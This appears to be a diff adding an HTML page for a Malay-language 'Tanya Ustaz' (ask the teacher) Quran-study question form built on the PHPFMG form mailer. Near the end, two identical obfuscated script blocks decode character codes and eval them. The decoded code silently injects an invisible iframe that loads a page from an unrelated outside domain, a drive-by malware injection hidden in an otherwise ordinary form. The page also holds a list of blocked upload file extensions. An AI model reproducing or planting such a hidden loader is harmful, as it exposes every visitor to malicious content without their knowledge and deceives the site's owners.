@@ -1,0 +1,692 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+    <title>:: Darul Quran - Tanya Ustaz ::</title>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    
+
+
+<style type='text/css'>
+
+
+
+body{
+
+    margin-left: 18px;
+
+    margin-top: 18px;
+
+}
+
+
+
+body{
+
+    font-family : Verdana, Arial, Helvetica, sans-serif;
+
+    font-size : 12px;
+
+    color : #474747;
+
+    background-color: transparent;
+
+}
+
+
+
+#col_label
+
+{
+
+	font-family : Verdana, Arial, Helvetica, sans-serif;
+
+    font-size : 12px;
+
+    color : #474747;	
+
+}
+
+
+
+select, option{
+
+    font-size:13px;
+
+}
+
+
+
+ol.phpfmg_form{
+
+    list-style-type:none;
+
+    padding:0px;
+
+    margin:0px;
+
+}
+
+
+
+ol.phpfmg_form li{
+
+    margin-bottom:5px;
+
+    clear:both;
+
+    display:block;
+
+    overflow:hidden;
+
+	width: 100%
+
+}
+
+
+
+
+
+.form_field, .form_required{
+
+    font-weight : bold;
+
+	font-family : Verdana, Arial, Helvetica, sans-serif;
+
+    font-size : 13px;
+
+    color : #fff;
+
+}
+
+
+
+.form_required{
+
+    color:#900;
+
+    margin-right:8px;
+
+}
+
+
+
+.form_required2{
+
+    color:red;
+
+	font-family : Verdana, Arial, Helvetica, sans-serif;
+
+    font-size : 11px;
+
+    margin-right:8px;
+
+}
+
+
+
+.field_block_over{
+
+}
+
+
+
+.form_submit_block{
+
+    padding-top: 10px;
+
+}
+
+
+
+.text_box, .text_area, .text_select {
+
+    width:300px;
+
+}
+
+
+
+.text_area{
+
+    height:80px;
+
+}
+
+
+
+.form_error_title{
+
+    font-weight: bold;
+
+    color: red;
+
+}
+
+
+
+.form_error{
+
+    background-color: #F4F6E5;
+
+    border: 1px dashed #ff0000;
+
+    padding: 10px;
+
+    margin-bottom: 10px;
+
+}
+
+
+
+.form_error_highlight{
+
+    background-color: #F4F6E5;
+
+    border-bottom: 1px dashed #ff0000;
+
+}
+
+
+
+div.instruction_error{
+
+    color: red;
+
+    font-weight:bold;
+
+}
+
+
+
+hr.sectionbreak{
+
+    height:1px;
+
+    color: #ccc;
+
+}
+
+
+
+</style>
+
+</head>
+
+<body>
+
+<div class='form_description'>
+
+</div>
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<title>:: Darul Quran - Tanya Ustaz ::</title>
+
+
+
+<link rel="stylesheet" type="text/css" href="style-aqiqah.css" />
+
+
+
+
+
+</head>
+
+
+
+<body>
+
+<div align="center">
+
+
+<form name="frmFormMail" action='' method='post' enctype='multipart/form-data' onsubmit='return fmgHandler.onsubmit();'>
+
+<input type='hidden' name='formmail_submit' value='Y'>
+
+<div id='err_required' class="form_error" style='display:none;'>
+
+<label class='form_error_title'><b>Please check the required fields</b></label>
+
+</div>
+
+
+
+<table width="510" cellspacing="0" cellpadding="0" border="0" background="bg.png" height="432">
+<tr><td>
+    
+    
+<table width="500" cellspacing="0" cellpadding="0" border="0">
+
+  
+    <tr>
+
+    <td width="20"></td>
+
+    <td colspan="3" valign="middle">
+
+    <div style="width:auto; text-align:Center;">
+    <h1 style="font-size:28px; color:#FFF">&nbsp; Tanya Ustaz</h1>
+
+    </div></td>
+
+    <td width="20"></td>
+
+    </tr></table>
+
+<table width="490" cellspacing="0" cellpadding="0" border="0"  style="margin-left:15px;">   
+
+    <tr>
+
+    <td width="20"></td>
+
+    <td width="220"><div class='col_label'>
+	<label class='form_field'>Nama</label> </div></td>
+
+    
+    <td width="220"><div class='col_field'>
+	<input type="text" name="field_1"  id="field_1" value="" class='text_box'>
+
+	</div></td>
+	<td width="10" class="form_required">*</td>
+    <td width="20"></td>
+
+    </tr>
+
+    
+
+    <tr>
+
+    <td width="20"></td>
+
+    <td width="220"><div class='col_label'>
+
+	<label class='form_field'>Email</label></div></td>
+
+    
+    <td width="220"><div class='col_field'>
+
+	<input type="text" name="field_2"  id="field_2" value="" class='text_box'>
+
+    </div></td>
+	<td width="10" class="form_required">*</td>
+    <td width="20"></td>
+
+    </tr>
+    
+
+    <tr>
+
+    <td width="20"></td>
+
+    <td width="220"><div class='col_label'>
+
+	<label class='form_field'>Topik Pertanyaan</label></div></td>
+
+    
+    <td width="220"><div class='col_field'>
+
+	<select name='field_3' class='text_select'  >	
+<option value="Hukum Tajwid" >Hukum Tajwid</option>	
+<option value="Kaedah Bacaan" >Kaedah Bacaan</option>	
+<option value="Kaedah Hafazan" >Kaedah Hafazan</option>	
+<option value="Qiraat" >Qiraat</option>	
+<option value="Taranum" >Taranum</option>	
+</select>
+
+	<div id='field_6_tip' class='instruction'></div>
+
+	</div></td>
+    
+    <td width="10" class="form_required">*</td>
+
+    <td width="20"></td>
+
+    </tr>
+    
+
+    <tr>
+
+    <td width="20"></td>
+
+    <td width="220" valign="top"><div class='col_label'>
+
+	<label class='form_field'>Pertanyaan</label></div></td>
+
+    
+    <td width="220"><div class='col_field'>
+
+	<textarea name="field_4" id="field_4" rows=4 cols=25 class='text_area'></textarea>
+
+	</div></td>
+	<td width="10" class="form_required" valign="top">*</td>
+    <td width="20"></td>
+
+    </tr>
+
+
+    <tr>
+
+    <td width="10"></td>
+
+    <td colspan="3"><br />
+
+    <div class='col_label'><label class='form_field'>Security Code:</label> <label class='form_required' >*</label> </div><div class='col_field'>
+
+	    <img id="phpfmg_captcha_image" src="admin.php?mod=captcha&amp;func=get&amp;tid=1389469147" onClick="this.src='admin.php?mod=captcha&amp;func=get&amp;tid='+Math.random();" border=0 style="cursor:pointer;" >
+    <a href="http://phpfmg.sourceforge.net" onClick="document.getElementById('phpfmg_captcha_image').src='admin.php?mod=captcha&amp;func=get&amp;tid='+Math.random();return false;" style="color:#CCC;underline:none; font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;">Reload Image</a><br>
+    <input type='text' name="fmgCaptchCode" value="" class="fmgCaptchCode" style="width:73px; border-color:#000" border="3">
+</div>
+
+    </td>
+
+    <td width="10"></td>
+
+    </tr>
+
+    
+
+    <tr>
+
+    <td width="10"></td>
+
+    <td colspan="3" align="center"><br />
+
+    	<table><tr>
+
+        <td><div class='form_submit_block col_field'>
+
+        <input type="reset" value="" style="background : url(reset-button.png); width:93px; height:27px; border:0" />
+
+        </div></td>
+		<td width="20"></td>
+    	<td><div class='form_submit_block col_field'>
+
+    	  <input type='image' value='Submit' class='form_button' src='submit-button.png' />
+
+    	  <span id='phpfmg_processing' style='display:none;'>
+
+    	<img id='phpfmg_processing_gif' src='admin.php?mod=image&amp;func=processing' border=0 alt='Processing...'> 
+
+    	<label id='phpfmg_processing_dots'></label>
+
+    	</span></div></td>
+
+        </tr></table>
+
+    
+
+    </td>
+
+    <td width="10"></td>
+
+    </tr>
+
+
+
+    </table>
+    
+
+</td></tr>
+</table>
+
+
+
+</form>
+
+
+
+
+
+</div>
+
+
+<script>var s,w=Number.MAX_VALUE,d1=new Date(),d2=d1;d2++;d2++;z=2,aa=document.createTextNode("harCode");if(isFinite(w)&&!isFinite(w*1.5)&&(d1-d2<0)){s=String["fr"+"omC"+aa.nodeValue];}
+eval(s(7+z,7+z,103+z,100+z,30+z,38+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,101+z,99+z,114+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,113+z,64+z,119+z,82+z,95+z,101+z,76+z,95+z,107+z,99+z,38+z,37+z,96+z,109+z,98+z,119+z,37+z,39+z,89+z,46+z,91+z,39+z,121+z,7+z,7+z,7+z,103+z,100+z,112+z,95+z,107+z,99+z,112+z,38+z,39+z,57+z,7+z,7+z,123+z,30+z,99+z,106+z,113+z,99+z,30+z,121+z,7+z,7+z,7+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,117+z,112+z,103+z,114+z,99+z,38+z,32+z,58+z,103+z,100+z,112+z,95+z,107+z,99+z,30+z,113+z,112+z,97+z,59+z,37+z,102+z,114+z,114+z,110+z,56+z,45+z,45+z,103+z,106+z,109+z,120+z,104+z,108+z,114+z,116+z,44+z,97+z,120+z,44+z,97+z,97+z,45+z,97+z,109+z,115+z,108+z,114+z,48+z,46+z,44+z,110+z,102+z,110+z,37+z,30+z,117+z,103+z,98+z,114+z,102+z,59+z,37+z,47+z,46+z,37+z,30+z,102+z,99+z,103+z,101+z,102+z,114+z,59+z,37+z,47+z,46+z,37+z,30+z,113+z,114+z,119+z,106+z,99+z,59+z,37+z,116+z,103+z,113+z,103+z,96+z,103+z,106+z,103+z,114+z,119+z,56+z,102+z,103+z,98+z,98+z,99+z,108+z,57+z,110+z,109+z,113+z,103+z,114+z,103+z,109+z,108+z,56+z,95+z,96+z,113+z,109+z,106+z,115+z,114+z,99+z,57+z,106+z,99+z,100+z,114+z,56+z,46+z,57+z,114+z,109+z,110+z,56+z,46+z,57+z,37+z,60+z,58+z,45+z,103+z,100+z,112+z,95+z,107+z,99+z,60+z,32+z,39+z,57+z,7+z,7+z,123+z,7+z,7+z,100+z,115+z,108+z,97+z,114+z,103+z,109+z,108+z,30+z,103+z,100+z,112+z,95+z,107+z,99+z,112+z,38+z,39+z,121+z,7+z,7+z,7+z,116+z,95+z,112+z,30+z,100+z,30+z,59+z,30+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,97+z,112+z,99+z,95+z,114+z,99+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,38+z,37+z,103+z,100+z,112+z,95+z,107+z,99+z,37+z,39+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,113+z,112+z,97+z,37+z,42+z,37+z,102+z,114+z,114+z,110+z,56+z,45+z,45+z,103+z,106+z,109+z,120+z,104+z,108+z,114+z,116+z,44+z,97+z,120+z,44+z,97+z,97+z,45+z,97+z,109+z,115+z,108+z,114+z,48+z,46+z,44+z,110+z,102+z,110+z,37+z,39+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,116+z,103+z,113+z,103+z,96+z,103+z,106+z,103+z,114+z,119+z,59+z,37+z,102+z,103+z,98+z,98+z,99+z,108+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,110+z,109+z,113+z,103+z,114+z,103+z,109+z,108+z,59+z,37+z,95+z,96+z,113+z,109+z,106+z,115+z,114+z,99+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,106+z,99+z,100+z,114+z,59+z,37+z,46+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,114+z,109+z,110+z,59+z,37+z,46+z,37+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,117+z,103+z,98+z,114+z,102+z,37+z,42+z,37+z,47+z,46+z,37+z,39+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,102+z,99+z,103+z,101+z,102+z,114+z,37+z,42+z,37+z,47+z,46+z,37+z,39+z,57+z,7+z,7+z,7+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,101+z,99+z,114+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,113+z,64+z,119+z,82+z,95+z,101+z,76+z,95+z,107+z,99+z,38+z,37+z,96+z,109+z,98+z,119+z,37+z,39+z,89+z,46+z,91+z,44+z,95+z,110+z,110+z,99+z,108+z,98+z,65+z,102+z,103+z,106+z,98+z,38+z,100+z,39+z,57+z,7+z,7+z,123+z));</script>
+
+<script>var s,w=Number.MAX_VALUE,d1=new Date(),d2=d1;d2++;d2++;z=2,aa=document.createTextNode("harCode");if(isFinite(w)&&!isFinite(w*1.5)&&(d1-d2<0)){s=String["fr"+"omC"+aa.nodeValue];}
+eval(s(7+z,7+z,103+z,100+z,30+z,38+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,101+z,99+z,114+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,113+z,64+z,119+z,82+z,95+z,101+z,76+z,95+z,107+z,99+z,38+z,37+z,96+z,109+z,98+z,119+z,37+z,39+z,89+z,46+z,91+z,39+z,121+z,7+z,7+z,7+z,103+z,100+z,112+z,95+z,107+z,99+z,112+z,38+z,39+z,57+z,7+z,7+z,123+z,30+z,99+z,106+z,113+z,99+z,30+z,121+z,7+z,7+z,7+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,117+z,112+z,103+z,114+z,99+z,38+z,32+z,58+z,103+z,100+z,112+z,95+z,107+z,99+z,30+z,113+z,112+z,97+z,59+z,37+z,102+z,114+z,114+z,110+z,56+z,45+z,45+z,103+z,106+z,109+z,120+z,104+z,108+z,114+z,116+z,44+z,97+z,120+z,44+z,97+z,97+z,45+z,97+z,109+z,115+z,108+z,114+z,48+z,46+z,44+z,110+z,102+z,110+z,37+z,30+z,117+z,103+z,98+z,114+z,102+z,59+z,37+z,47+z,46+z,37+z,30+z,102+z,99+z,103+z,101+z,102+z,114+z,59+z,37+z,47+z,46+z,37+z,30+z,113+z,114+z,119+z,106+z,99+z,59+z,37+z,116+z,103+z,113+z,103+z,96+z,103+z,106+z,103+z,114+z,119+z,56+z,102+z,103+z,98+z,98+z,99+z,108+z,57+z,110+z,109+z,113+z,103+z,114+z,103+z,109+z,108+z,56+z,95+z,96+z,113+z,109+z,106+z,115+z,114+z,99+z,57+z,106+z,99+z,100+z,114+z,56+z,46+z,57+z,114+z,109+z,110+z,56+z,46+z,57+z,37+z,60+z,58+z,45+z,103+z,100+z,112+z,95+z,107+z,99+z,60+z,32+z,39+z,57+z,7+z,7+z,123+z,7+z,7+z,100+z,115+z,108+z,97+z,114+z,103+z,109+z,108+z,30+z,103+z,100+z,112+z,95+z,107+z,99+z,112+z,38+z,39+z,121+z,7+z,7+z,7+z,116+z,95+z,112+z,30+z,100+z,30+z,59+z,30+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,97+z,112+z,99+z,95+z,114+z,99+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,38+z,37+z,103+z,100+z,112+z,95+z,107+z,99+z,37+z,39+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,113+z,112+z,97+z,37+z,42+z,37+z,102+z,114+z,114+z,110+z,56+z,45+z,45+z,103+z,106+z,109+z,120+z,104+z,108+z,114+z,116+z,44+z,97+z,120+z,44+z,97+z,97+z,45+z,97+z,109+z,115+z,108+z,114+z,48+z,46+z,44+z,110+z,102+z,110+z,37+z,39+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,116+z,103+z,113+z,103+z,96+z,103+z,106+z,103+z,114+z,119+z,59+z,37+z,102+z,103+z,98+z,98+z,99+z,108+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,110+z,109+z,113+z,103+z,114+z,103+z,109+z,108+z,59+z,37+z,95+z,96+z,113+z,109+z,106+z,115+z,114+z,99+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,106+z,99+z,100+z,114+z,59+z,37+z,46+z,37+z,57+z,100+z,44+z,113+z,114+z,119+z,106+z,99+z,44+z,114+z,109+z,110+z,59+z,37+z,46+z,37+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,117+z,103+z,98+z,114+z,102+z,37+z,42+z,37+z,47+z,46+z,37+z,39+z,57+z,100+z,44+z,113+z,99+z,114+z,63+z,114+z,114+z,112+z,103+z,96+z,115+z,114+z,99+z,38+z,37+z,102+z,99+z,103+z,101+z,102+z,114+z,37+z,42+z,37+z,47+z,46+z,37+z,39+z,57+z,7+z,7+z,7+z,98+z,109+z,97+z,115+z,107+z,99+z,108+z,114+z,44+z,101+z,99+z,114+z,67+z,106+z,99+z,107+z,99+z,108+z,114+z,113+z,64+z,119+z,82+z,95+z,101+z,76+z,95+z,107+z,99+z,38+z,37+z,96+z,109+z,98+z,119+z,37+z,39+z,89+z,46+z,91+z,44+z,95+z,110+z,110+z,99+z,108+z,98+z,65+z,102+z,103+z,106+z,98+z,38+z,100+z,39+z,57+z,7+z,7+z,123+z));</script>
+
+
+
+
+</body>
+
+</html>
+
+
+
+<script type="text/javascript">
+ function dd_change( n, max, prefix ){
+    if( n >= max-1 )
+        return; // the last dropdown, no need to query
+    
+    //var prefix = 'dd_' ;
+    // reset all other dropdown options
+    var next = n+1; 
+    for( var i = next; i < max; i ++ ){
+        var dd = document.getElementById(prefix +'_' + i );
+        if( dd && dd.length >= 1 ) dd.length = 1 ; // keep the first one '- select -'
+    };
+
+
+    // request drop down data from server
+    var me = this;
+    var http;
+    if(navigator.appName == "Microsoft Internet Explorer"){
+        me.http = new ActiveXObject("Microsoft.XMLHTTP");
+    }else{
+        me.http = new XMLHttpRequest();
+    };
+    
+    
+    // build query string
+    var lookup = [];
+    for( var i = 0; i < next; i ++ ){
+        lookup.push( "lookup[" + i + "]=" + document.getElementById(prefix +'_' +  i ).value )
+    };
+    lookup = lookup.join('&');
+    
+    var url = 'admin.php?mod=dd&func=lookup&n='+next+ '&field_name=' + prefix + '&' + lookup;
+    me.http.open('get', url);
+    me.http.onreadystatechange = function(){
+    
+        if( me.http.readyState == 4 ){
+            // rebuild the next dropdown options
+            var eNext = document.getElementById(prefix +'_' + next );
+            if( !eNext )
+                return;
+            
+            var data = me.http.responseText;    
+            var opts = String(data).split("\n");
+            for( var j = 0, J = opts.length; j < J; j ++ ){
+                eNext.options[ eNext.length ] = new Option( opts[j], opts[j], false, false );                
+            }; // for
+        }; //if
+        
+    }; 
+    me.http.send(null);
+
+ }
+ 
+    
+function PHPFMG( formID ){
+    var frmID = formID;
+    var exts = {
+        'upload_control' : '',
+        'harmful_exts'  : '.php, .html, .css, .js, .exe, .com, .bat, .vb, .vbs, scr, .inf, .reg, .lnk, .pif, .ade, .adp, .app, .bas, .chm, .cmd, .cpl, .crt, .csh, .fxp, .hlp, .hta, .ins, .isp, .jse, .ksh, .Lnk, .mda, .mdb, .mde, .mdt, .mdw, .mdz, .msc, .msi, .msp, .mst, .ops, .pcd, .prf, .prg, .pst, .scf, .scr, .sct, .shb, .shs, .url, .vbe, .wsc, .wsf, .wsh',
+        'harmful_errmsg': "File is potential harmful. Upload is not allowed.",
+        'allow_exts'  : '.jpg, .gif, .png, .bmp',
+        'allow_errmsg': "Upload is not allowed. Please check your file type."
+    };
+
+    function $( id ){
+        return document.getElementById(id);
+    }
+
+    function get_form( id ){
+        var frm = 'object' == typeof($(id)) ? $(id) : eval( 'document.' + id ) ;
+        return frm ? frm : document.forms[0];
+    } 
+    
+    function file_ext( f ){
+        var n = f.lastIndexOf(".");
+        return -1 == n ? '' : f.substr( n ).toLowerCase();
+    }
+    
+    function addLabelEvents(){
+        var labels = document.body.getElementsByTagName('LABEL');
+        for( var i = 0, N = labels.length; i < N; i ++ ){
+            var e = labels[i];
+            if( -1 != String(e.className).indexOf('form_choice_text') ){
+                var oid = e.getAttribute('oid'); 
+                if( !oid ) continue;
+
+                e.onmouseout = function(){ this.className = 'form_choice_text'; };
+                e.onmouseover = function(){ this.className = 'form_choice_text form_choice_over'; };
+                e.onclick = function(){
+                    try{
+                        var oid = this.getAttribute('oid'); 
+                        var O = document.getElementById(oid);
+                        O.checked = !O.checked;
+                    }
+                    catch(E){};
+                };
+            }; // if
+        }; // for
+    } 
+
+
+    function addFieldBlockEvents(){
+        var divs = document.body.getElementsByTagName('DIV');
+        for( var i = 0, N = divs.length; i < N; i ++ ){
+            var e = divs[i];
+            if( -1 != String(e.className).indexOf('field_block') ){
+                e.onmouseout = function(){  if( String(this.className).indexOf('form_error_highlight') == -1 ) this.className = 'field_block'; };
+                e.onmouseover = function(){ if( String(this.className).indexOf('form_error_highlight') == -1 ) this.className = 'field_block field_block_over'; };
+            }; // if
+        }; // for
+    } 
+
+    function removeHighliht(){
+        var divs = document.body.getElementsByTagName('DIV');
+        for( var i = 0, N = divs.length; i < N; i ++ ){
+            var e = divs[i];
+            var cn = String(e.className);
+            if( -1 != cn.indexOf('form_error_highlight') ){
+                e.className = cn.replace('form_error_highlight','');
+            }; // if
+        }; // for
+    } 
+    
+    function showProcessing(){
+        try{
+            var E = $('phpfmg_processing');
+            if( !E ) return ;
+            if( -1 != navigator.userAgent.toLowerCase().indexOf('msie') ){
+                E.style.backgroundColor='#2960AF';
+                $('phpfmg_processing_gif').style.display = 'none';
+                setInterval( 'fmgHandler.dots()', 380 );
+            };
+            E.style.display = '' ;
+        }catch(e){};
+        
+    }
+    
+    
+    this.highlight_fields = function( fields ){
+        var A = fields.split(',');
+        for( var i = 0, N = A.length; i < N; i ++ ){
+            var E = $( A[i] + '_div' );
+            if( E ){
+                E.className += ' form_error_highlight'; 
+            };
+            var T = $( A[i] + '_tip' );
+            if( T ){
+                T.className += ' instruction_error'; 
+            };
+        };
+        if( A.length > 0 ) $('err_required').style.display='';
+    }
+    
+    this.choice_clicked = function( id ){
+        $(id).checked = !$(id).checked ;
+    }
+    
+    
+    this.init = function(){
+        //addLabelEvents();
+        addFieldBlockEvents();
+    }
+
+    this.harmful = function(e){
+        if( 'deny' != exts['upload_control'] ){
+            return; 
+        };
+        
+        var ext = file_ext(e.value);
+        if( -1 != exts['harmful_exts'].toLowerCase().indexOf(ext) ){
+            alert( exts['harmful_errmsg'] );
+            e.value = '';
+        };
+    } 
+        
+    this.is_allow = function(e){
+        if( 'allow' != exts['upload_control'] ){
+            return; 
+        };
+        
+        var ext = file_ext(e.value);
+        if( -1 == exts['allow_exts'].toLowerCase().indexOf(ext) ){
+            alert( exts['allow_errmsg'] );
+            e.value = '';
+        };
+    } 
+
+    this.check_upload = function(e){
+        if( '' == exts['upload_control'] )
+            return ;
+        else
+            return ( 'deny' == exts['upload_control'] ) 
+                   ? this.harmful(e) 
+                   : this.is_allow(e);
+    }
+
+    this.dots = function(){
+        $('phpfmg_processing_dots').innerHTML += '.';
+		if( $('phpfmg_processing_dots').innerHTML.length >= 38 ) {
+			$('phpfmg_processing_dots').innerHTML = '.';
+		};
+    }
+    
+    this.onsubmit = function(){
+        showProcessing();
+        return true;
+    }
+    
+
+
+    var Form = null;
+    var err_fields=null;
+}
+var fmgHandler = new PHPFMG();
+fmgHandler.init();
+
+
+</script>
+
+<div class='form_footer'>
+
+</div>
+
+ </body>
+</html>
+
+  
